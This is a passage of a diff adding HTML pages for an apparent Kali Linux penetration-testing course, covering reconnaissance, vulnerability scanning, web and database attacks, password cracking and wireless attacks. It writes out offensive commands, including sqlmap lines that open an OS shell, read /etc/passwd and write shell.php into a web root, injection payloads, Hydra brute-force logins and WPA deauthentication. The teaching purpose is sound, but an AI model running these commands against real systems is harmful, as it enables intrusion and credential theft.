+                    <li><strong>Drag and Drop API</strong> - Makes elements draggable</li>
+                    <li><strong>Server-Sent Events</strong> - Allows servers to push updates to clients</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Create an HTML5 page that includes:</p>
+                <ol>
+                    <li>Use semantic elements (header, nav, main, section, footer)</li>
+                    <li>Add a video element with multiple source formats</li>
+                    <li>Create an enhanced form with HTML5 input types (email, date, number)</li>
+                    <li>Add form validation using the required attribute</li>
+                    <li>Include a canvas element with a simple drawing</li>
+                </ol>
+            </div>
+        </div>
+    </section>
     <!-- Kali Linux Module Content -->
     <!-- Module 1 Content -->
     <section class="module-content" id="module-kali-1">
@@ -1258,6 +1996,819 @@ HTTP is the mechanism by which HTML documents are transported across the interne
     </section>
 
     <!-- Additional Kali Linux modules would go here... -->
+     <!-- Module 2 Content -->
+    <section class="module-content" id="module-2">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 2: Information Gathering</h2>
+                <p>Master reconnaissance techniques to gather intelligence about target systems.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Passive Information Gathering</h3>
+                <p>Passive reconnaissance involves collecting information without directly interacting with the target system.</p>
+                
+                <h4>WHOIS Lookup</h4>
+                <p>WHOIS databases contain registration information about domain names, IP addresses, and autonomous systems.</p>
+                <div class="code-block">
+                    <span class="command">whois example.com</span> <span class="comment"># Get domain registration info</span><br>
+                    <span class="command">whois 192.168.1.1</span> <span class="comment"># Get IP address info</span>
+                </div>
+                
+                <h4>DNS Enumeration</h4>
+                <p>DNS enumeration helps discover hosts, subdomains, and other DNS records associated with a domain.</p>
+                <div class="code-block">
+                    <span class="command">dnsenum example.com</span> <span class="comment"># Enumerate DNS information</span><br>
+                    <span class="command">dnsrecon -d example.com</span> <span class="comment"># DNS reconnaissance tool</span><br>
+                    <span class="command">fierce --domain example.com</span> <span class="comment"># DNS reconnaissance</span>
+                </div>
+                
+                <h4>Search Engine Reconnaissance</h4>
+                <p>Use search engines to find information about the target:</p>
+                <ul>
+                    <li>Google dorking with specific search operators</li>
+                    <li>Shodan for finding specific devices and services</li>
+                    <li>Wayback Machine for historical website data</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Active Information Gathering</h3>
+                <p>Active reconnaissance involves directly interacting with the target system to gather information.</p>
+                
+                <h4>Network Scanning with Nmap</h4>
+                <p>Nmap (Network Mapper) is a powerful network discovery and security auditing tool.</p>
+                <div class="code-block">
+                    <span class="command">nmap -sS 192.168.1.0/24</span> <span class="comment"># TCP SYN scan on subnet</span><br>
+                    <span class="command">nmap -sV 192.168.1.1</span> <span class="comment"># Version detection</span><br>
+                    <span class="command">nmap -O 192.168.1.1</span> <span class="comment"># OS detection</span><br>
+                    <span class="command">nmap -A 192.168.1.1</span> <span class="comment"># Aggressive scan</span><br>
+                    <span class="command">nmap -p 1-1000 192.168.1.1</span> <span class="comment"># Scan specific ports</span><br>
+                    <span class="command">nmap --script vuln 192.168.1.1</span> <span class="comment"># Vulnerability scripts</span>
+                </div>
+                
+                <h4>Service Enumeration</h4>
+                <p>Identify services running on discovered ports:</p>
+                <div class="code-block">
+                    <span class="command">nmap -sV -sC 192.168.1.1</span> <span class="comment"># Version and default scripts</span><br>
+                    <span class="command">enum4linux 192.168.1.1</span> <span class="comment"># Enumerate Windows/Samba hosts</span><br>
+                    <span class="command">smbclient -L //192.168.1.1</span> <span class="comment"># List SMB shares</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Advanced Reconnaissance Tools</h3>
+                
+                <h4>Recon-ng</h4>
+                <p>A full-featured web reconnaissance framework written in Python.</p>
+                <div class="code-block">
+                    <span class="command">recon-ng</span> <span class="comment"># Start Recon-ng</span><br>
+                    <span class="command">[recon-ng] > modules search</span> <span class="comment"># Search for modules</span><br>
+                    <span class="command">[recon-ng] > modules load recon/domains-hosts/google_site_web</span><br>
+                    <span class="command">[recon-ng][google_site_web] > set SOURCE example.com</span><br>
+                    <span class="command">[recon-ng][google_site_web] > run</span>
+                </div>
+                
+                <h4>Maltego</h4>
+                <p>A proprietary software used for open-source intelligence and forensics.</p>
+                <ul>
+                    <li>Graphical interface for information gathering</li>
+                    <li>Automates the process of data mining</li>
+                    <li>Visualizes relationships between pieces of information</li>
+                </ul>
+                
+                <h4>TheHarvester</h4>
+                <p>Gathers emails, subdomains, hosts, employee names, open ports and banners from different public sources.</p>
+                <div class="code-block">
+                    <span class="command">theharvester -d example.com -b google</span> <span class="comment"># Search Google</span><br>
+                    <span class="command">theharvester -d example.com -l 500 -b all</span> <span class="comment"># All sources, limit 500</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Perform information gathering on a test domain:</p>
+                <ol>
+                    <li>Use WHOIS to gather domain registration information</li>
+                    <li>Perform DNS enumeration to discover subdomains</li>
+                    <li>Use Nmap to scan for open ports and services</li>
+                    <li>Identify the operating system and service versions</li>
+                    <li>Use Recon-ng to gather additional intelligence</li>
+                    <li>Document all findings in a structured report</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 3 Content -->
+    <section class="module-content" id="module-3">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 3: Vulnerability Analysis</h2>
+                <p>Learn to identify and assess security vulnerabilities in systems and networks.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Vulnerability Scanning Concepts</h3>
+                <p>Vulnerability scanning is the process of identifying security weaknesses and misconfigurations in systems, networks, and applications.</p>
+                
+                <p>Types of vulnerability scans:</p>
+                <ul>
+                    <li><strong>Network Vulnerability Scans</strong>: Identify vulnerabilities in network devices and services</li>
+                    <li><strong>Web Application Scans</strong>: Find security issues in web applications</li>
+                    <li><strong>Database Scans</strong>: Identify misconfigurations and vulnerabilities in databases</li>
+                    <li><strong>Host-based Scans</strong>: Check individual systems for security issues</li>
+                </ul>
+                
+                <p>Vulnerability scanning methodology:</p>
+                <ol>
+                    <li>Discovery: Identify active hosts and services</li>
+                    <li>Port scanning: Determine open ports and services</li>
+                    <li>Service detection: Identify service versions</li>
+                    <li>Vulnerability detection: Check for known vulnerabilities</li>
+                    <li>Reporting: Document findings and recommendations</li>
+                </ol>
+            </div>
+            
+            <div class="lesson">
+                <h3>Network Vulnerability Scanning</h3>
+                
+                <h4>Nmap Vulnerability Scripting</h4>
+                <p>Nmap includes scripts for vulnerability detection:</p>
+                <div class="code-block">
+                    <span class="command">nmap --script vuln 192.168.1.1</span> <span class="comment"># Run all vulnerability scripts</span><br>
+                    <span class="command">nmap --script safe 192.168.1.1</span> <span class="comment"># Run non-intrusive scripts</span><br>
+                    <span class="command">nmap --script "http-*" 192.168.1.1</span> <span class="comment"># Run all HTTP scripts</span>
+                </div>
+                
+                <h4>OpenVAS</h4>
+                <p>OpenVAS (Open Vulnerability Assessment System) is a full-featured vulnerability scanner.</p>
+                <div class="code-block">
+                    <span class="command">openvas-start</span> <span class="comment"># Start OpenVAS services</span><br>
+                    <span class="comment"># Access web interface at https://127.0.0.1:9392</span><br>
+                    <span class="comment"># Create a new target and scan task</span><br>
+                    <span class="comment"># Review scan results and generate reports</span>
+                </div>
+                
+                <h4>Nessus</h4>
+                <p>A proprietary vulnerability scanner with extensive vulnerability checks.</p>
+                <ul>
+                    <li>Comprehensive vulnerability database</li>
+                    <li>Customizable scanning policies</li>
+                    <li>Detailed reporting capabilities</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Web Application Vulnerability Scanning</h3>
+                
+                <h4>Nikto</h4>
+                <p>Nikto is an open-source web server scanner that tests for dangerous files/CGIs, outdated server software, and other problems.</p>
+                <div class="code-block">
+                    <span class="command">nikto -h http://example.com</span> <span class="comment"># Basic scan</span><br>
+                    <span class="command">nikto -h http://example.com -p 80,443</span> <span class="comment"># Specific ports</span><br>
+                    <span class="command">nikto -h http://example.com -Tuning 1,2,3,4,5,6,7,8,9,0,a,b,c</span> <span class="comment"># All tests</span>
+                </div>
+                
+                <h4>OWASP ZAP</h4>
+                <p>The OWASP Zed Attack Proxy (ZAP) is one of the world's most popular free security tools for finding vulnerabilities in web applications.</p>
+                <ul>
+                    <li>Automated scanner</li>
+                    <li>Manual testing tools</li>
+                    <li>REST API for automation</li>
+                    <li>Extensible through add-ons</li>
+                </ul>
+                
+                <h4>WPScan</h4>
+                <p>WPScan is a black box WordPress vulnerability scanner.</p>
+                <div class="code-block">
+                    <span class="command">wpscan --url http://example.com</span> <span class="comment"># Basic WordPress scan</span><br>
+                    <span class="command">wpscan --url http://example.com --enumerate u</span> <span class="comment"># Enumerate users</span><br>
+                    <span class="command">wpscan --url http://example.com --passwords passwords.txt</span> <span class="comment"># Password attack</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Perform vulnerability assessment on a test environment:</p>
+                <ol>
+                    <li>Set up a vulnerable virtual machine (Metasploitable recommended)</li>
+                    <li>Perform network scanning with Nmap to identify services</li>
+                    <li>Use Nmap scripting engine to identify vulnerabilities</li>
+                    <li>Run a comprehensive scan with OpenVAS</li>
+                    <li>Perform web application scanning with Nikto and OWASP ZAP</li>
+                    <li>Document all vulnerabilities with risk ratings</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 4 Content -->
+    <section class="module-content" id="module-4">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 4: Web Application Testing</h2>
+                <p>Discover and exploit vulnerabilities in web applications and services.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Web Application Architecture</h3>
+                <p>Understanding web application architecture is crucial for effective testing:</p>
+                
+                <ul>
+                    <li><strong>Client-Side</strong>: Browser, JavaScript, HTML, CSS</li>
+                    <li><strong>Server-Side</strong>: Web server, application server, database</li>
+                    <li><strong>Communication Protocols</strong>: HTTP/HTTPS, WebSockets</li>
+                    <li><strong>Authentication Mechanisms</strong>: Cookies, tokens, sessions</li>
+                </ul>
+                
+                <p>Common web application components:</p>
+                <ul>
+                    <li>Web servers (Apache, Nginx, IIS)</li>
+                    <li>Application frameworks (Django, Ruby on Rails, Spring)</li>
+                    <li>Databases (MySQL, PostgreSQL, MongoDB)</li>
+                    <li>Caching systems (Redis, Memcached)</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Common Web Vulnerabilities</h3>
+                
+                <h4>OWASP Top 10</h4>
+                <p>The OWASP Top 10 represents the most critical web application security risks:</p>
+                <ol>
+                    <li>Broken Access Control</li>
+                    <li>Cryptographic Failures</li>
+                    <li>Injection</li>
+                    <li>Insecure Design</li>
+                    <li>Security Misconfiguration</li>
+                    <li>Vulnerable and Outdated Components</li>
+                    <li>Identification and Authentication Failures</li>
+                    <li>Software and Data Integrity Failures</li>
+                    <li>Security Logging and Monitoring Failures</li>
+                    <li>Server-Side Request Forgery (SSRF)</li>
+                </ol>
+                
+                <h4>SQL Injection</h4>
+                <p>SQL injection occurs when an attacker can insert malicious SQL code into a query.</p>
+                <div class="code-block">
+                    <span class="comment"># Example vulnerable query:</span><br>
+                    <span class="comment"># SELECT * FROM users WHERE username = '$username' AND password = '$password'</span><br>
+                    <br>
+                    <span class="comment"># SQL injection payload:</span><br>
+                    <span class="comment"># username: admin' -- </span><br>
+                    <span class="comment"># Resulting query: SELECT * FROM users WHERE username = 'admin' -- ' AND password = ''</span>
+                </div>
+                
+                <h4>Cross-Site Scripting (XSS)</h4>
+                <p>XSS allows attackers to inject client-side scripts into web pages viewed by other users.</p>
+                <div class="code-block">
+                    <span class="comment"># Example XSS payload:</span><br>
+                    <span class="comment">&lt;script&gt;alert('XSS')&lt;/script&gt;</span><br>
+                    <span class="comment">&lt;img src=x onerror=alert('XSS')&gt;</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Web Application Testing Tools</h3>
+                
+                <h4>Burp Suite</h4>
+                <p>Burp Suite is an integrated platform for performing security testing of web applications.</p>
+                <ul>
+                    <li><strong>Proxy</strong>: Intercept and modify HTTP/S traffic</li>
+                    <li><strong>Scanner</strong>: Automated vulnerability detection</li>
+                    <li><strong>Intruder</strong>: Customizable attack tool</li>
+                    <li><strong>Repeater</strong>: Manual request manipulation</li>
+                    <li><strong>Sequencer</strong>: Analyze session token randomness</li>
+                </ul>
+                
+                <h4>SQLmap</h4>
+                <p>SQLmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws.</p>
+                <div class="code-block">
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1"</span> <span class="comment"># Basic SQL injection test</span><br>
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" --dbs</span> <span class="comment"># Enumerate databases</span><br>
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" -D database --tables</span> <span class="comment"># List tables</span><br>
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump</span> <span class="comment"># Dump table</span>
+                </div>
+                
+                <h4>Dirb and Dirbuster</h4>
+                <p>Tools for discovering hidden directories and files on web servers.</p>
+                <div class="code-block">
+                    <span class="command">dirb http://example.com</span> <span class="comment"># Basic directory brute force</span><br>
+                    <span class="command">dirb http://example.com /usr/share/dirb/wordlists/common.txt</span> <span class="comment"># Custom wordlist</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Test a vulnerable web application:</p>
+                <ol>
+                    <li>Set up a vulnerable web application (DVWA or WebGoat)</li>
+                    <li>Configure Burp Suite to intercept traffic</li>
+                    <li>Test for SQL injection vulnerabilities</li>
+                    <li>Identify and exploit XSS vulnerabilities</li>
+                    <li>Use SQLmap to automate SQL injection testing</li>
+                    <li>Discover hidden directories with Dirb</li>
+                    <li>Document all findings with proof of concept</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 5 Content -->
+    <section class="module-content" id="module-5">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 5: Database Assessment</h2>
+                <p>Learn techniques to test database security and identify potential weaknesses.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Database Security Fundamentals</h3>
+                <p>Understanding database security is essential for comprehensive penetration testing:</p>
+                
+                <ul>
+                    <li><strong>Authentication</strong>: Verifying user identities</li>
+                    <li><strong>Authorization</strong>: Controlling access to resources</li>
+                    <li><strong>Encryption</strong>: Protecting data at rest and in transit</li>
+                    <li><strong>Auditing</strong>: Tracking database activities</li>
+                    <li><strong>Patch Management</strong>: Keeping databases updated</li>
+                </ul>
+                
+                <p>Common database types:</p>
+                <ul>
+                    <li><strong>Relational Databases</strong>: MySQL, PostgreSQL, Oracle, SQL Server</li>
+                    <li><strong>NoSQL Databases</strong>: MongoDB, Cassandra, Redis</li>
+                    <li><strong>In-Memory Databases</strong>: Redis, Memcached</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>SQL Database Assessment</h3>
+                
+                <h4>SQL Injection Techniques</h4>
+                <p>Advanced SQL injection methods:</p>
+                <ul>
+                    <li><strong>Union-based</strong>: Using UNION operator to extract data</li>
+                    <li><strong>Error-based</strong>: Exploiting error messages to extract data</li>
+                    <li><strong>Boolean-based Blind</strong>: Using true/false conditions</li>
+                    <li><strong>Time-based Blind</strong>: Using time delays to infer data</li>
+                    <li><strong>Out-of-band</strong>: Using alternative channels to extract data</li>
+                </ul>
+                
+                <h4>Database Enumeration</h4>
+                <p>Techniques for gathering information about database structure:</p>
+                <div class="code-block">
+                    <span class="comment"># MySQL Information Schema</span><br>
+                    <span class="comment">SELECT * FROM information_schema.tables</span><br>
+                    <span class="comment">SELECT * FROM information_schema.columns WHERE table_name = 'users'</span><br>
+                    <br>
+                    <span class="comment"># SQL Server System Tables</span><br>
+                    <span class="comment">SELECT name FROM sys.databases</span><br>
+                    <span class="comment">SELECT table_name FROM information_schema.tables</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>NoSQL Database Assessment</h3>
+                
+                <h4>NoSQL Injection</h4>
+                <p>NoSQL databases are vulnerable to injection attacks similar to SQL injection:</p>
+                <div class="code-block">
+                    <span class="comment"># Example vulnerable MongoDB query:</span><br>
+                    <span class="comment">db.users.find({username: req.body.username, password: req.body.password})</span><br>
+                    <br>
+                    <span class="comment"># NoSQL injection payload:</span><br>
+                    <span class="comment">{"username": "admin", "password": {"$ne": ""}}</span><br>
+                    <span class="comment"># Resulting query: db.users.find({username: "admin", password: {"$ne": ""}})</span>
+                </div>
+                
+                <h4>MongoDB Assessment Tools</h4>
+                <p>Tools for testing MongoDB security:</p>
+                <div class="code-block">
+                    <span class="command">mongodb --host 192.168.1.1 --port 27017</span> <span class="comment"># Connect to MongoDB</span><br>
+                    <span class="command">show dbs</span> <span class="comment"># List databases</span><br>
+                    <span class="command">use database_name</span> <span class="comment"># Switch to database</span><br>
+                    <span class="command">show collections</span> <span class="comment"># List collections</span><br>
+                    <span class="command">db.collection_name.find()</span> <span class="comment"># Query collection</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Database Exploitation Tools</h3>
+                
+                <h4>SQLmap Advanced Usage</h4>
+                <p>Advanced SQLmap techniques for database exploitation:</p>
+                <div class="code-block">
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" --os-shell</span> <span class="comment"># Get OS shell</span><br>
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" --os-pwn</span> <span class="comment"># OOB connection</span><br>
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"</span> <span class="comment"># Read files</span><br>
+                    <span class="command">sqlmap -u "http://example.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"</span> <span class="comment"># Write files</span>
+                </div>
+                
+                <h4>NoSQL Exploitation Framework</h4>
+                <p>Tools for NoSQL database exploitation:</p>
+                <ul>
+                    <li><strong>NoSQLMap</strong>: Automated NoSQL database enumeration and web application exploitation</li>
+                    <li><strong>MongoDB Assessment Tools</strong>: Various scripts for MongoDB security testing</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Perform database security assessment:</p>
+                <ol>
+                    <li>Set up a vulnerable database environment</li>
+                    <li>Identify SQL injection vulnerabilities</li>
+                    <li>Use SQLmap to automate database enumeration</li>
+                    <li>Extract sensitive data from databases</li>
+                    <li>Test for NoSQL injection vulnerabilities</li>
+                    <li>Attempt privilege escalation within the database</li>
+                    <li>Document all database security issues</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 6 Content -->
+    <section class="module-content" id="module-6">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 6: Password Attacks</h2>
+                <p>Master various password cracking techniques and tools available in Kali Linux.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Password Security Fundamentals</h3>
+                <p>Understanding how passwords are stored and protected:</p>
+                
+                <h4>Password Storage Methods</h4>
+                <ul>
+                    <li><strong>Plain Text</strong>: Passwords stored without encryption (insecure)</li>
+                    <li><strong>Hashing</strong>: One-way encryption (MD5, SHA1, SHA256)</li>
+                    <li><strong>Salted Hashing</strong>: Hash with random data added (more secure)</li>
+                    <li><strong>Key Derivation Functions</strong>: bcrypt, PBKDF2, Argon2</li>
+                </ul>
+                
+                <h4>Common Password Hashes</h4>
+                <div class="code-block">
+                    <span class="comment"># MD5: 32 characters (hexadecimal)</span><br>
+                    <span class="comment"># Example: 5d41402abc4b2a76b9719d911017c592</span><br>
+                    <br>
+                    <span class="comment"># SHA1: 40 characters (hexadecimal)</span><br>
+                    <span class="comment"># Example: aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</span><br>
+                    <br>
+                    <span class="comment"># SHA256: 64 characters (hexadecimal)</span><br>
+                    <span class="comment"># Example: 2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Password Cracking Techniques</h3>
+                
+                <h4>Dictionary Attacks</h4>
+                <p>Using pre-compiled lists of common passwords:</p>
+                <div class="code-block">
+                    <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt</span><br>
+                    <span class="command">hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt</span>
+                </div>
+                
+                <h4>Brute Force Attacks</h4>
+                <p>Trying all possible character combinations:</p>
+                <div class="code-block">
+                    <span class="command">john --incremental hashes.txt</span><br>
+                    <span class="command">hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a</span> <span class="comment"># 6 character brute force</span>
+                </div>
+                
+                <h4>Rule-Based Attacks</h4>
+                <p>Applying transformation rules to dictionary words:</p>
+                <div class="code-block">
+                    <span class="command">john --wordlist=wordlist.txt --rules hashes.txt</span><br>
+                    <span class="command">hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule</span>
+                </div>
+                
+                <h4>Hybrid Attacks</h4>
+                <p>Combining dictionary words with brute force patterns:</p>
+                <div class="code-block">
+                    <span class="command">hashcat -m 0 -a 6 hashes.txt wordlist.txt ?d?d?d</span> <span class="comment"># Dictionary + 3 digits</span><br>
+                    <span class="command">hashcat -m 0 -a 7 hashes.txt ?d?d?d wordlist.txt</span> <span class="comment"># 3 digits + Dictionary</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Password Cracking Tools</h3>
+                
+                <h4>John the Ripper</h4>
+                <p>A fast password cracker supporting many hash types:</p>
+                <div class="code-block">
+                    <span class="command">john hashes.txt</span> <span class="comment"># Default attack</span><br>
+                    <span class="command">john --format=raw-md5 hashes.txt</span> <span class="comment"># Specify hash format</span><br>
+                    <span class="command">john --show hashes.txt</span> <span class="comment"># Show cracked passwords</span><br>
+                    <span class="command">john --wordlist=wordlist.txt --rules hashes.txt</span> <span class="comment"># Wordlist with rules</span>
+                </div>
+                
+                <h4>Hashcat</h4>
+                <p>The world's fastest and most advanced password recovery utility:</p>
+                <div class="code-block">
+                    <span class="command">hashcat -m 0 hashes.txt wordlist.txt</span> <span class="comment"># MD5 cracking</span><br>
+                    <span class="command">hashcat -m 1000 hashes.txt wordlist.txt</span> <span class="comment"># NTLM cracking</span><br>
+                    <span class="command">hashcat -m 2500 hashes.txt wordlist.txt</span> <span class="comment"># WPA/WPA2 cracking</span><br>
+                    <span class="command">hashcat -I</span> <span class="comment"># Show available hardware</span><br>
+                    <span class="command">hashcat -b</span> <span class="comment"># Benchmark</span>
+                </div>
+                
+                <h4>Hydra</h4>
+                <p>A parallelized login cracker which supports numerous protocols:</p>
+                <div class="code-block">
+                    <span class="command">hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"</span><br>
+                    <span class="command">hydra -L users.txt -P passwords.txt 192.168.1.1 ssh</span><br>
+                    <span class="command">hydra -l administrator -P passwords.txt 192.168.1.1 smb</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Online Password Attacks</h3>
+                
+                <h4>Web Application Login Attacks</h4>
+                <p>Tools for attacking web application authentication:</p>
+                <div class="code-block">
+                    <span class="command">burpsuite</span> <span class="comment"># Use Intruder for login brute force</span><br>
+                    <span class="command">patator http_fuzz url=http://example.com/login.php method=POST body='user=admin&pass=FILE0' 0=passwords.txt -x ignore:fgrep='Invalid password'</span>
+                </div>
+                
+                <h4>SSH and Telnet Attacks</h4>
+                <p>Attacking remote access services:</p>
+                <div class="code-block">
+                    <span class="command">medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh</span><br>
+                    <span class="command">ncrack -u admin -P passwords.txt ssh://192.168.1.1</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Perform password attacks in a controlled environment:</p>
+                <ol>
+                    <li>Create password hashes using different algorithms</li>
+                    <li>Use John the Ripper to crack simple hashes</li>
+                    <li>Use Hashcat with GPU acceleration for faster cracking</li>
+                    <li>Perform online attacks against a test web application</li>
+                    <li>Use Hydra to attack SSH and FTP services</li>
+                    <li>Compare the effectiveness of different attack methods</li>
+                    <li>Document password policy recommendations</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 7 Content -->
+    <section class="module-content" id="module-7">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 7: Wireless Attacks</h2>
+                <p>Learn to assess and exploit vulnerabilities in wireless networks.</p>
+            </div>
+            
+            <div class="lesson">
+                <h3>Wireless Networking Fundamentals</h3>
+                <p>Understanding wireless network protocols and security:</p>
+                
+                <h4>Wireless Standards</h4>
+                <ul>
+                    <li><strong>802.11a</strong>: 5 GHz, 54 Mbps</li>
+                    <li><strong>802.11b</strong>: 2.4 GHz, 11 Mbps</li>
+                    <li><strong>802.11g</strong>: 2.4 GHz, 54 Mbps</li>
+                    <li><strong>802.11n</strong>: 2.4/5 GHz, 600 Mbps</li>
+                    <li><strong>802.11ac</strong>: 5 GHz, 1.3 Gbps</li>
+                    <li><strong>802.11ax (Wi-Fi 6)</strong>: 2.4/5 GHz, 10 Gbps</li>
+                </ul>
+                
+                <h4>Wireless Security Protocols</h4>
+                <ul>
+                    <li><strong>WEP</strong>: Wired Equivalent Privacy (broken)</li>
+                    <li><strong>WPA</strong>: Wi-Fi Protected Access (TKIP)</li>
+                    <li><strong>WPA2</strong>: Wi-Fi Protected Access 2 (CCMP/AES)</li>
+                    <li><strong>WPA3</strong>: Latest security standard</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Wireless Reconnaissance</h3>
+                
+                <h4>Wireless Network Discovery</h4>
+                <p>Tools for discovering wireless networks:</p>
+                <div class="code-block">
+                    <span class="command">airmon-ng</span> <span class="comment"># List wireless interfaces</span><br>
+                    <span class="command">airmon-ng start wlan0</span> <span class="comment"># Put interface in monitor mode</span><br>
+                    <span class="command">airodump-ng wlan0mon</span> <span class="comment"># Capture wireless traffic</span>
+                </div>
+                
+                <h4>Wireless Packet Analysis</h4>
+                <p>Analyzing wireless network traffic:</p>
+                <div class="code-block">
+                    <span class="command">airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon</span> <span class="comment"># Capture specific network</span><br>
+                    <span class="command">wireshark</span> <span class="comment"># Analyze captured packets</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Wireless Attack Techniques</h3>
+                
+                <h4>WEP Cracking</h4>
+                <p>WEP is vulnerable to several attacks:</p>
+                <div class="code-block">
+                    <span class="command">aireplay-ng -1 0 -a 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon</span> <span class="comment"># Fake authentication</span><br>
+                    <span class="command">aireplay-ng -3 -b 00:11:22:33:44:55 -h 11:22:33:44:55:66 wlan0mon</span> <span class="comment"># ARP request replay</span><br>
+                    <span class="command">aircrack-ng -b 00:11:22:33:44:55 capture-01.cap</span> <span class="comment"># Crack WEP key</span>
+                </div>
+                
+                <h4>WPA/WPA2 Cracking</h4>
+                <p>WPA/WPA2 attacks require capturing the handshake:</p>
+                <div class="code-block">
+                    <span class="command">airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon</span> <span class="comment"># Capture handshake</span><br>
+                    <span class="command">aireplay-ng -0 10 -a 00:11:22:33:44:55 -c 11:22:33:44:55:66 wlan0mon</span> <span class="comment"># Deauth attack</span><br>
+                    <span class="command">aircrack-ng -w wordlist.txt -b 00:11:22:33:44:55 capture-01.cap</span> <span class="comment"># Crack handshake</span>
+                </div>
+                
+                <h4>WPS Attacks</h4>
+                <p>Wi-Fi Protected Setup vulnerabilities:</p>
+                <div class="code-block">
+                    <span class="command">wash -i wlan0mon</span> <span class="comment"># Find WPS-enabled networks</span><br>
+                    <span class="command">reaver -i wlan0mon -b 00:11:22:33:44:55 -vv</span> <span class="comment"># WPS PIN attack</span><br>
+                    <span class="command">bully -b 00:11:22:33:44:55 wlan0mon</span> <span class="comment"># Alternative WPS tool</span>
+                </div>
+            </div>
+            
+            <div class="lesson">
+                <h3>Advanced Wireless Attacks</h3>
+                
+                <h4>Evil Twin Attacks</h4>
+                <p>Creating rogue access points:</p>
+                <div class="code-block">
+                    <span class="command">airbase-ng -a 00:11:22:33:44:55 --essid "Free WiFi" -c 6 wlan0mon</span> <span class="comment"># Create rogue AP</span><br>
+                    <span class="command">dnsmasq -C dnsmasq.conf</span> <span class="comment"># DHCP and DNS server</span>
+                </div>
+                
+                <h4>KARMA Attacks</h4>
+                <p>Responding to probe requests from clients:</p>
+                <div class="code-block">
+                    <span class="command">karma</span> <span class="comment"># KARMA attack tool</span>
+                </div>
+                
+                <h4>WPA3 Attacks</h4>
+                <p>Emerging attacks against WPA3:</p>
+                <ul>
+                    <li>Dragonblood vulnerabilities</li>
+                    <li>Downgrade attacks</li>
+                    <li>Side-channel attacks</li>
+                </ul>
+            </div>
+            
+            <div class="lesson">
+                <h3>Practice Exercise</h3>
+                <p>Perform wireless security assessment:</p>
+                <ol>
+                    <li>Set up a test wireless network with different security protocols</li>
+                    <li>Put your wireless card in monitor mode</li>
+                    <li>Discover nearby wireless networks</li>
+                    <li>Capture WPA handshakes using deauthentication attacks</li>
+                    <li>Crack WEP and WPA passwords</li>
+                    <li>Set up a rogue access point</li>
+                    <li>Document wireless security recommendations</li>
+                </ol>
+            </div>
+        </div>
+    </section>
+
+    <!-- Module 8 Content -->
+    <section class="module-content" id="module-8">
+        <div class="container">
+            <button class="back-button">← Back to Modules</button>
+            <div class="module-header">
+                <h2>Module 8: Exploitation & Post-Exploitation</h2>
